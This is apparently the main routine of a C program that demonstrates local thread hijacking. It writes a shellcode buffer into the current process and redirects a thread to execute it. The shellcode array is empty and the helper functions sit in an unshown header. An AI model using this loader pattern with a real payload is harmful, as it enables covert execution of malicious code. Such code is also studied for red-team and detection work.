#include "LocalThreadHIjacking.h"

int main()
{

		UCHAR Shellcode[] = {
	
		};

	SIZE_T PayloadSize = sizeof(Shellcode);
	HANDLE ThreadHandle = NULL;
	PVOID TargetPayloadBuffer = NULL;

	if (!WritePayload(Shellcode, PayloadSize, &TargetPayloadBuffer, &ThreadHandle))
	{
		WARN("Failed To Write Shellcode To Local Process!");
		PRINT_ERROR("WritePayload");
		return 1;
	}

	if (!HijackLocalThread(ThreadHandle, TargetPayloadBuffer))
	{
		WARN("Failed To Hijack Local Thread!");
		PRINT_ERROR("HijackLocalThread");
		return 1;
	}

	CHAR("Quit...");
	getchar();

	return 0;

}